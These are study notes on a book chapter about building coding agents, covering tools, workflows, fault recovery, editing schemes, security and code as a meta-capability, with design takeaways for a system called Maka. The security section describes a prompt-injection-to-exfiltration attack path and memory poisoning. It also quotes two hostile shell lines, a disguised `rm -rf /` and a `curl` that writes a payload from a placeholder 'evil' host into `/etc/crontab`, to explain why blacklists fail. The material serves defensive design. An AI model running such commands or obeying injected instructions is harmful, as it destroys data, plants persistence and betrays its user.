# Chapter 5 · Coding Agent and Code Generation — Knowledge Point Extraction

> Source: `book/chapter5.md`. Chapter main thread: **a general-purpose agent that can handle any task is, at its architectural core, a coding agent plus a file system** — the file system is the workspace where the agent stores code, data, memory, and intermediate results. The first half covers how to build a reliable coding agent; the second half argues that code generation is a **meta-capability**, unfolding its six directions of application beyond programming.

## Part 1: The Coding Agent

### [KP-05-01] Coding Is the Foundational Capability of an Agent
- **One-line core**: Code generation is not the exclusive province of a few specialized agents; it is a foundational capability every general-purpose agent should possess. With current SOTA models, basic coding capability requires no complex architecture.
- **Key design points**: Five core action types of a typical task (browse directory ls/glob, read, edit/write, run bash, grep/search); **a basic coding agent needs only seven core tools** (Code Interpreter isolated sandbox + Bash + Read + Write + Edit + Glob + Grep) — "complete yet minimal," integrable at low cost into almost any system; the power of combination (a TODO checklist needs only Grep + Write).
- **Maka design takeaways**: Read/Write/Edit/Bash are precisely the core subset of the seven tools, giving Maka a natural foundation as a coding-agent workbench; the Code Interpreter sandbox, Glob, and Grep should be built in as first-class citizens rather than external patches.
- **Writable design doc**: 《Maka Coding Toolset Design: Seven Core Tools and Runtime Integration》

### [KP-05-02] From Manus to OpenClaw: The Coding Core of General-Purpose Agents
- **One-line core**: **A coding agent plus a file system is the most central technical foundation of an open-task general-purpose agent**; the file system is not merely data storage but the hub of the agent's memory, knowledge, and capabilities.
- **Key design points**: Why coding is the core rather than Deep Research / Computer Use — almost all efficient content generation ultimately lands on code (PPT is OOXML code, data analysis uses Python, browser operations can be solidified into RPA code); OpenClaw's typical 5-step execution flow (read memory → call tools → write code → produce artifacts → update memory); memory design: long-term memory stored in `MEMORY.md` (high-level facts + user preferences) plus dated Markdown log archives — three reasons for choosing Markdown over a vector database (users can read and edit directly, chronological order is preserved, Git rollback is possible); **the division of SOUL.md (identity/behavior rules) vs MEMORY.md (cross-session experience)**; applicability boundary: coding as the core suits **open-task** general-purpose agents, whereas for closed-space vertical customer-service agents code is just one tool among many — but **having coding capability is the common baseline for all agents**.
- **Maka design takeaways**: "Log is the Runtime" is isomorphic with OpenClaw's "file system as the hub"; the Event Log is machine-readable fact, the Markdown view is a human-readable, human-editable projection; persistent memory should clearly distinguish "records/evidence" from "reliable knowledge" (avoid automatically promoting a single record to a fact).
- **Writable design doc**: 《Maka Persistent Memory and Workspace Hub Design》

### [KP-05-03] The Overall Workflow of a Coding Agent
- **One-line core**: Project software-engineering best practices onto the agent's engineered workflow — **planning precedes action, validation runs throughout, and documentation evolves together with code**.
- **Key design points**: Project documentation (build a cognitive framework upon first contact with a repository; making knowledge explicit is a precondition for efficient collaboration); **project instruction files** (CLAUDE.md/AGENTS.md/.cursorrules auto-injected at session start = project-level system prompts carrying build/test commands, code style, and forbidden zones; from the context-engineering view this is the most economical **stable prefix**, KV-Cache friendly); AI-ready agent metrics ("can a remote newcomer work independently with only the codebase and docs"); task understanding and requirement clarification (complex requirements need exploratory research to clarify boundaries); **design docs** (answer which modules to change/which approach/new dependencies/impact, providing an efficient human intervention point, submitted to the user for review and approval upon completion); implementation and testing (**use "tests pass" rather than "code written" as the completion criterion** — the most common shortcut is reporting completion without running tests after writing code; self code review can run a linter or invoke a dedicated review Sub-Agent); documentation sync (outdated docs are worse than no docs).
- **Maka design takeaways**: TaskRun/Event Log naturally carry the "design doc" artifact and the "tests pass = termination fact" completion criterion (termination facts enter the log as auditable evidence); staged workflow templates can be provided for complex tasks (document → design → approve → implement → test → sync).
- **Writable design doc**: 《Maka Task Lifecycle: An Engineered Loop of Design-Implementation-Verification》

### [KP-05-04] Harness Engineering in Practice for Coding Agents
- **One-line core**: Among all task types, coding agents are the **most verifiable**; decades of software-engineering infrastructure naturally constitute a powerful Harness. Whether an agent runs stably depends less on how strong the model is than on how solid the infrastructure is.
- **Key design points**: The four Harness components (acceptance baseline / execution boundary / feedback signal / rollback means); the **four quadrants** (task clarity × verification automation — clear goal + auto-verifiable = best zone; vague goal + auto-verifiable = running off course efficiently; the Harness goal is to push as far as possible toward the "clear goal + automated verification" quadrant); industry practice (large-scale migration: knowledge must live in the codebase itself, constraints encoded into Linter/CI rather than docs, fully automated verify-and-correct chains; LangChain uses agents to analyze failure trajectories to improve the Harness — data-driven; Anthropic's long tasks = init agent + execution agent); **four transferable principles** (constraints over guidance / automate verification / feedback the faster and more structured the better / rollback must be reliable); **another purpose of constraints — preventing process errors** (a correct result reached by a wrong method is unacceptable; what is constrained is the action, not merely the result); **failure boundary control** (under parallel calls, failures propagate only within the same batch, not up to the parent level).
- **Maka design takeaways**: Directly supports "Feedback is not fact authority" — verification should be automated and feedback structured, but feedback/self-checks are only evidence and do not automatically become system facts; Maka can build in lint/test as verification tools, write feedback signals into the Event Log, and set approval and execution boundaries for dangerous actions.
- **Writable design doc**: 《Maka Harness Components: Acceptance Baseline, Execution Boundary, and Feedback Signal》

### [KP-05-05] Fault and Error Recovery
- **One-line core**: **An agent's reliability depends not on whether it makes mistakes, but on whether every class of error has a corresponding detection, recovery, and termination path**; the boundary of error handling is not a single request but the entire recovery loop.
- **Key design points**: Four-layer fault taxonomy (API layer: rate limiting/timeouts/output truncation; tool layer: hallucinated calls/malformed arguments/the tool repeatedly returning the same error while the model retries it verbatim; context layer: window overflow/compression failure/corrupted trajectory; control-flow layer: infinite loops/death spirals); **detection: classify first, then count** (retryable vs non-retryable — "is it worth retrying" rather than "should we retry"); pattern detection (duplicate-call fingerprints, consecutive-failure counters); **liveness and integrity monitoring** (the most dangerous streaming failure is silent hang-up, requiring an independent idle watchdog — **every long-lived connection needs a liveness signal, not reliance on connection timeouts alone**; tool calls missing their paired results are auto-repaired; product mode tolerantly patches, training-data collection mode strictly rejects repair to prevent pollution); **recovery: tiered escalation, transparent at each level** (① silent retry (exponential backoff + jitter, distinguishing foreground/background — background auxiliary failures are abandoned directly to prevent retry amplification) ② degradation and continuation (on output truncation raise the cap and resend / append meta-instructions to continue writing / degrade to a backup model after stripping private formats first) ③ expose to the user (only present when automatic means are exhausted, with the attempted actions attached)); **tool-layer errors do not terminate the session; turn the error into model input** (the error enters context as an ordinary tool result for the model to correct on the next turn); **the boundary of error handling is the recovery loop** (withhold error messages during recovery; if successful, the consumer never notices; only release them if everything fails); **termination: every recovery path must have a ceiling** (circuit-breaker thresholds come from production data — Claude Code's compression circuit breaker "3 consecutive times" came from real-session statistics, and ineffective retries waste roughly 250,000 API calls per day globally); death-spiral protection (disable side effects on the error path that would call the model again + a recursion-depth counter + global termination escalation: max iterations/budget/consecutive-failure thresholds exceeded → escalate to a human).
- **Maka design takeaways**: Directly maps to "Task may outlive a Turn" — TaskRun has a built-in fault classification table, duplicate-call fingerprint detection, a circuit breaker, and budget ceilings; the Event Log is the best data source for detecting "duplicate fingerprints / death spirals."
- **Writable design doc**: 《Maka Fault Recovery: Detection, Tiered Recovery, and Circuit-Breaker Termination》

### [KP-05-06] Coding Agent Implementation Tricks (The Search-Read-Edit Loop)
- **One-line core**: Five implementation tricks — parallelism and streaming, fine-grained context management, environment awareness, command-state persistence, and immediate feedback — let an agent work as fluidly as an experienced developer.
- **Key design points**: **Parallel tool calls, streaming execution, and cascading cancellation** (execute as soon as the first argument is complete / run mutually independent calls in parallel / fail-safe default of no / on failure cascade-cancel dependent calls in the same batch without affecting independent ones); fine-grained context management (**prefix returned content with line numbers so every line is labeled with its actual line number** — the model can precisely cite "line 42 of src/main.py"; command output keeps head+tail, elides the middle, and stores it in a temp file); **dynamic injection of environment info** (inject cwd/git branch/recent commits/change overview as a status bar before each inference — not hardcoded into the static system prompt, which would break the KV Cache); **command execution environment state persistence** (persistent terminal sessions share cwd/environment variables; nothing is lost after `cd`); **immediate syntax feedback** (when a file write completes, the tool layer runs a linter automatically and returns the result as part of the tool return value — like an IDE drawing a red squiggle the instant you type a mismatched bracket); **the search-read-edit loop** (grep/glob to locate → read with line numbers → string head-and-tail matching for edit → lint after write → search again to verify).
- **Maka design takeaways**: Read/Write/Edit/Bash can directly embed these "low-cost, high-return" features (line-number labeling, output truncation + persistence, post-write auto-lint, persistent terminal sessions); the agent status bar can be made a projection view of the Event Log (keeping environment awareness without breaking "the log as the single source of truth").
- **Writable design doc**: 《Maka Implementation Tricks: Line-Number Labeling, Output Truncation, and Instant Lint Feedback》

### [KP-05-07] Search Tools in Coding Agents
- **One-line core**: Four complementary search tools (regex/glob/semantic/symbol) are combined progressively "from coarse to fine, from semantic to syntactic."
- **Key design points**: Regex content matching (grep/ripgrep — finds text matches only, no semantic understanding); filename pattern matching (glob — fastest, the first step in exploring a project's structure); semantic code search (structure-aware chunking splits code into complete semantic units by function/class + hybrid retrieval with a reranker; suited to exploratory tasks); **the index-route debate**: terminal-style Claude Code **deliberately builds no embedding index** (purely agentic grep+glob on-the-fly search — avoids stale indexes, saves infrastructure, avoids sending embedded code to third-party services = a local-first security consideration), while IDE-style Cursor takes the opposite route; symbol-level definition/reference (LSP go-to-definition, key to refactoring — renames cannot rely on text search); combination strategy (semantic first → regex → symbol).
- **Maka design takeaways**: Provide grep+glob on-the-fly search by default (local-first, no index, no exfiltration of code); make the semantic embedding index and LSP symbol lookup optional enhancement modules chosen by the user.
- **Writable design doc**: 《Maka Search Tool Design: Progressive Retrieval with grep/glob/Semantic Search/LSP》

### [KP-05-08] File Editing Tools in Coding Agents
- **One-line core**: The difficulty of file editing lies not in the operation itself but in getting the LLM to tell the system "what to change and how" efficiently and reliably — i.e., the tension between human-language expression and machine-precise execution.
- **Key design points**: Comparison of five schemes — ① diff description + Apply Model (the main model generates a diff description, a smaller dedicated LLM applies the merge; the naive implementation is fragile at the merge step); ② **old string → new string** (Claude Code/Codex/Cursor; predictable and transparent, but deleting a large chunk requires outputting the full original text, and duplicated code needs longer context to disambiguate); ③ line-number targeting (precise and unambiguous, efficient for large deletions; multiple edits in one pass need a unified initial set of line numbers); ④ Vim-like edit commands (efficient for restructuring but a heavy syntax burden — **Vim was designed for humans: they need to keep seeing the current state to plan the next move, whereas a model thinks for a long time and then performs complex operations in batch**); ⑤ **string head-and-tail matching** (give only the first few lines + the last few lines; the framework matches the head and tail to locate the replacement region — combining the reliability of text replacement with the efficiency of the line-number scheme, as long as the "head and tail" is unique).
- **Maka design takeaways**: The Edit tool defaults to **string head-and-tail matching** (reliable + efficient + low error rate), with old→new and line-number targeting supported as fallbacks; editing history and final content are kept as traces for recovery and audit.
- **Writable design doc**: 《Maka Edit Tool: Comparison and Selection of Five Editing Schemes》

### [KP-05-09] Coding Agent Security
- **One-line core**: A coding agent has read-file, command-execution, and network-access privileges, so it must defend against the closed attack path of "prompt injection → reading private data → exfiltration"; the emphasis is on ensuring that even if the agent is injected, it never gets the chance to actually execute a dangerous action; there is also the question of **loyalty** — "whom does the agent serve."
- **Key design points**: **The fatal triad** (Simon Willison: access to private data / exposure to untrusted content / external communication capability — the three elements together are already dangerous enough); **the fourth dimension — persistent memory** (not a parallel necessary condition but an attack amplifier: writing biased/malicious instructions into long-term memory lets them lurk across sessions and trigger at the right time); three coding-specific incremental points — ① **command semantic parsing** (not a keyword blacklist: the combinatorial explosion of shells makes blacklists useless (`$(echo rm) -rf /` bypasses them); a production-grade Harness understands argument types and consumption rules to recognize "a seemingly harmless flag that consumes the next argument and hides a dangerous payload" (`curl -o /etc/crontab http://evil/payload`)) ② **sandbox isolation and network egress control** (network off by default, whitelist proxy release on demand — even if injection reads sensitive data, there is no egress to send it out; source directories mounted read-only, a separate writable workspace, and credential files not mounted at all; resource limits + timeouts return **structured errors** to the model for a next-turn fix rather than silently killing the process) ③ **cross-session persistent-memory defense** (content written to long-term memory must undergo the same trust review as external content); **principal loyalty** (a model defaults to "whoever talks to me, I help," but a real agent sits amid multi-party delegation — when bargaining for its owner, the counterparty across the table is the adversary; being too obedient vs too paranoid both fail; **prompt injection is essentially an attempted defection/recruitment**; the code of conduct = protect the owner's private information and even its "existence," refuse to read the refusal list item by item, private bottom lines are not the same as public stances, execute only the owner's explicit and specific instructions, withstand repeated pressure — the Harness supplies the stance the model lacks by default: absolute loyalty to the owner, prudence toward outsiders).
- **Maka design takeaways**: Tenet 4 "Feedback is not fact authority" is of a piece with "server-side truth / independent verification of critical operations"; Self-check and bounded repair are explicitly not equivalent to security authorization; sandbox network-off-by-default + whitelist, source read-only + writable workspace, credentials not mounted, command semantic parsing rather than blacklists; the loyalty code of conduct is written into the fixed layer of the system prompt.
- **Writable design doc**: 《Maka Security: Sandbox Isolation, Command Semantic Parsing, and the Loyalty Code of Conduct》

## Part 2: Code: The Meta-Capability of General-Purpose Agents

### [KP-05-10] Meta-Capability: Definition and Six Directions
- **One-line core**: Code generation is a meta-capability that "can create other capabilities" — writing new tools, new constraints, and new expressive forms on the spot; its value lies in thinking (formalization makes thinking rigorous and unambiguous) and in expression (code that runs is a proof of logical self-consistency, and execution results provide an objective standard of right and wrong).
- **Key design points**: Six directions (by what the meta-capability acts upon, from inside out): ① thought itself (a thinking tool) ② business rules (executable constraints) ③ content presentation (PPT/video/visualization) ④ system interfaces (bridging heterogeneous APIs) ⑤ user interfaces (dynamically constructing forms) ⑥ the agent itself (code creating/repairing agents = self-bootstrap); the unifying thread is "from the inside out, finally returning to itself."
- **Maka design takeaways**: Position coding as a "first-class meta-capability" rather than an ordinary tool — artifacts are the carriers of the code meta-capability (scripts/validation rules/HTML/SQL artifacts/new agent definitions); logging/context/UI design serve "code can be dynamically created and immediately executed."
- **Writable design doc**: 《Maka Meta-Capability Framework: Coding as the Base of a Six-Dimensional Meta-Capability》

### [KP-05-11] Code as a Thinking Tool
- **One-line core**: An LLM's thinking is probabilistic approximation, while mathematics and logic demand deterministic precision; the division of labor = let the LLM understand the problem and write code, let the code interpreter / symbolic computation engine do the precise computation.
- **Key design points**: Math problems (pure natural-language miscalculation vs the correct `only_phys = phys - both`); symbolic computation collaboration (Wolfram keeps exact forms vs LLM natural-language understanding — the LLM recognizes the mathematical structure and converts it into a formal language handed to SymPy / a constraint solver); Experiment 5-1 (Code Interpreter with sympy/scipy/numpy scores significantly higher on AIME); Experiment 5-2 (python-constraint on the logic-puzzle K&K, 90%+); **the model-scaffolding seesaw law** (a stronger model can use a thinner scaffold; a weaker model needs the scaffold to do more; evaluation premise: the same scaffold paired with models of different capabilities can yield drastically different conclusions).
- **Maka design takeaways**: Build in a Python Code Interpreter sandbox with math libraries as a standard tool; model selection/budget strategy should recognize that "scaffold thickness" adjusts dynamically with model capability.
- **Writable design doc**: 《Maka Code Interpreter Tool: The Precise-Computation Backstop for Mathematical and Logical Reasoning》

### [KP-05-12] Code as a Constraint on Business Rules
- **One-line core**: Transform business rules from natural-language documents into executable code, making them enforced constraints on system behavior rather than advisory guidelines; the real value lies in preventing irreversible erroneous operations, and the last line of defense must be built on data that the model cannot fabricate.
- **Key design points**: Natural-language rules vs codified rules are **complementary, not substitutes** (prompt rules can explain policy to users, find workarounds, and pre-judge feasibility before calling; code validation is precise and unambiguous, suited to complex rule combinations); **merging validation with execution (τ-bench airline cancellation policy)** — layer one: parameters as a thinking checklist (tool descriptions list the complete policy + `expected_*` parameters that force the model to write out its reasoning explicitly and require checking the order first — the act of filling in parameters is itself a forced checklist); layer two: **server-side truth validation is the gatekeeper** (cabin class/insurance/time/status are all looked up by the server from the database, time taken from the server clock — **no policy fact comes from model-self-reported parameters** — the model may hallucinate or be manipulated by injection; when self-reported and true values diverge, log an alert); the triple guarantee (prompt rules → tool description + checklist → server-side codified truth validation); **independence means not merely an independent model, but more importantly an independent data source**.
- **Maka design takeaways**: Highly consistent with Tenet 4 — the model's self-report (the `expected_*` of Self-check) is only evidence and a bounded repair opportunity; server-side truth = in Maka, the tool results/termination facts in the Event Log are authoritative; validation tools "check the truth first, then rule"; critical quantities such as time take the system clock.
- **Writable design doc**: 《Maka Rules Engine: Checklist Guidance + Data-Layer Truth Gatekeeping》

### [KP-05-13] Code-Driven Multimedia Generation (Proposer-Reviewer Mechanism)
- **One-line core**: Reframe the creation of complex documents such as PPT/video as a code-generation problem, bypassing the difficulty of GUI visual positioning; introduce visual-quality feedback through a Proposer-Reviewer dual-agent mechanism, achieving terminable iterative improvement.
- **Key design points**: PPT (Slidev = Markdown + HTML defines content, agent-friendly); after the agent writes code it cannot see the actual rendered effect → the Proposer-Reviewer mechanism (the Proposer generates Slidev code; the Reviewer runs the code to render images and uses a **Vision LLM** to analyze the output and produce **structured improvement suggestions** (with page number / issue type / severity, not a vague "doesn't look good"); iterate until quality meets the bar or the maximum number of rounds (e.g., 5) — "quality bar met" and "max rounds" = the two kinds of explicit termination conditions of Loop engineering); of the same origin as Chapter 4's pre-approval (generation and review separated); **the core advantage of the dual-agent division of labor lies in context management** (the Reviewer sees only the latest rendered image, the Proposer accumulates only structured textual feedback; a single agent's context blows its limit quickly); video editing (Blender API + FFmpeg expose functionality in a structured way); **two-step localization strategy** (Experiment 5-6: coarse-grained screenshots every 10 seconds → fine-grained per-second precise localization, start-point error ≤ 3 seconds).
- **Maka design takeaways**: artifacts carry multimedia outputs such as PPT/video/HTML; provide a Proposer-Reviewer collaboration template (sub-agent mode + a rendering/visual-feedback channel); "structured feedback as a special event" feeds into the Event Log, making multi-agent iterations replayable and auditable.
- **Writable design doc**: 《Maka Multimedia Artifact Pipeline: Proposer-Reviewer Iteration and Two-Step Visual Localization》

### [KP-05-14] Code as a System Adapter
- **One-line core**: When an external system has no ready-made SDK, has non-standard interfaces, or its format drifts across versions, the agent generates adapter code on the spot — code becomes the "universal glue" for connecting to any system; in observability scenarios this concretizes into log parsing and diagnosis that automatically track format evolution.
- **Key design points**: The universal-glue capability (read interface docs or observe real responses to generate adapter code on the spot); RPA solidification (for systems without APIs, first operate via Computer Use, then solidify into RPA code); **the adaptive log-parsing loop** (Experiment 5-7: the front end hits an unparseable log format → reports to the Agent → the Agent generates parsing code → a virtual browser tests it automatically → hot-update — automatically tracking format evolution); **log-diagnosis automation** (Experiment 5-8: the Agent reads production logs + architecture docs + PRD → judges whether behavior matches expectations → locates the module → generates a structured problem report → **generates regression test cases (citing the problem-trajectory ID and key interaction rounds)** → creates a GitHub Issue via MCP).
- **Maka design takeaways**: Directly echoes Tenet 1 — Maka's own trajectory logs can be self-parsed/diagnosed by the agent, generating regression tests; artifacts carry "parsing code" and "regression test cases," realizing the automated closed loop of "log → test → Issue."
- **Writable design doc**: 《Maka Observability: Adaptive Log Parsing and Trajectory Diagnosis》

### [KP-05-15] Code as Generative UI
- **One-line core**: An agent dynamically generates forms, charts, and even full web applications, upgrading static text chat into rich multimodal interaction; but "generating arbitrary code as UI" must be backed by security mechanisms, and dynamically generated software needs the trust boundary moved down to the data layer.
- **Key design points**: **A2UI-style declarative protocol** (the agent outputs only a JSON "UI description manifest," and the client renders it with pre-prepared safe components — "customers can only order what's on the menu; they can't go into the kitchen and cook themselves"; AG-UI is an event/transport protocol and is complementary to rather than the same kind of thing as A2UI); HTML deliverables replacing Markdown reporting (interactive demos / better visualization / continuously improvable deliverables); clarifying user intent (cascading forms filled in one pass to avoid multi-round Q&A); **the SQL query artifact pattern** (the agent generates SQL as an independent executable artifact, the system queries the database directly and renders it as a table — **data flows from the database straight to the UI, completely bypassing the LLM middleman**; the execution layer uses a read-only account / SELECT-only / no DDL / parameterization / time-and-quota limits); **dynamically generated software → trust boundary moved down to the data layer** ("even if the AI writes wrong code, the permission constraints still cannot be bypassed" — the application layer can dynamically generate interfaces and flows, while the data layer uses stable, human-reviewed mechanisms to enforce "who can do what to which data": database row-level security, constraints/validators, controlled views/stored procedures; every read/write carries an **access context** bound by the trusted runtime (user/tenant/role/agent identity), and dynamic code can only access as a restricted identity, never obtaining high-privilege credentials that could bypass the rules; all data access paths must pass through the trusted data layer).
- **Maka design takeaways**: artifacts are naturally containers for HTML deliverables and SQL artifacts; "Log is the Runtime" provides the factual base for the artifact pattern (the LLM generates code, the system executes it, results enter the log, and the data path is the shortest); support a secure execution channel where "SQL/visualization artifacts are executed directly by the front end/data layer" (read-only account, SELECT-only, parameterized); incorporate "trust boundary at the data layer + access context" into the workspace security model.
- **Writable design doc**: 《Maka Artifact Delivery Pattern: HTML/SQL Artifacts and the Data-Layer Security Boundary》

### [KP-05-16] Code Creating Code: Agent Self-Bootstrap
- **One-line core**: An agent can use code to repair and create agents like itself; self-repair (OpenClaw doctor) is the precondition for self-bootstrap, and the most effective path to having an agent write high-quality agents is "example-based generation" — copying and adaptively modifying, rather than starting from scratch.
- **Key design points**: **OpenClaw doctor (an agent repairing agents)** — two layers working together: deterministic checks (config anomalies / state problems / service health; safe repairs execute automatically, risky operations need confirmation) + LLM fallback for hard cases (error-log analysis / config semantic understanding / causal inference / targeted repair); **common defects when having agents write agents** (without domain knowledge, even a strong model produces architecturally flawed agents: sloppy context management, non-standard tool design, lagging technology choices, disconnection from the external ecosystem); **the most effective path = provide high-quality agent implementations as reference examples** (the example code itself is the carrier of best practices; modifying an example is easier to get right than writing from zero); the "self-copy and adaptive modification" pattern (copy one's own code → adjust prompts to match the new role → swap tools → keep the architectural framework — gene replication plus mutation).
- **Maka design takeaways**: The coding capability can self-repair its own runtime (a built-in doctor: deterministic self-checks + LLM fallback), with repair actions risk-tiered and traced to the Event Log; one's own code/adapters serve as "reference examples" to support users in generating new agents, forming a closed loop of "Log is the Runtime + self-bootstrap."
- **Writable design doc**: 《Maka Self-Bootstrap: Self-Repair and Example-Based Agent Generation》

## Thinking Questions from the Book (transcribed key points)
1. Code generation is a meta-capability but introduces security risk — a sandbox limits capability; how do you balance security and capability?
2. Intergenerational error accumulation in agent self-bootstrap — how do you prevent bootstrap degeneration?
3. Log parsing automatically tracks format evolution — how do you distinguish "changes that need adaptation" from "anomalies that need reporting" (bugs)?
4. When the Reviewer's aesthetic preferences diverge from the target users', the feedback loop converges to a wrong local optimum — how do you get user preferences into the Reviewer loop?
5. Experience sedimented into system-prompt rules expands over time — how do you "garbage-collect" rules? Why can't a single successful change be treated directly as sustained evolution?
6. The "AI-ready" agent metric: how far is your team from having knowledge documented?
7. How should security strategy be designed in production for the four elements (the fatal triad + persistent memory)?
8. The artifact pattern lets generated SQL/HTML execute directly — how do you ensure security?
9. What are the advantages and limitations of "code as rules" (in-tool database truth validation + parameter guidance) compared with natural-language rules?
10. What are the trade-offs between "the agent generates code, the system executes the code" vs "the agent directly gives the answer"?
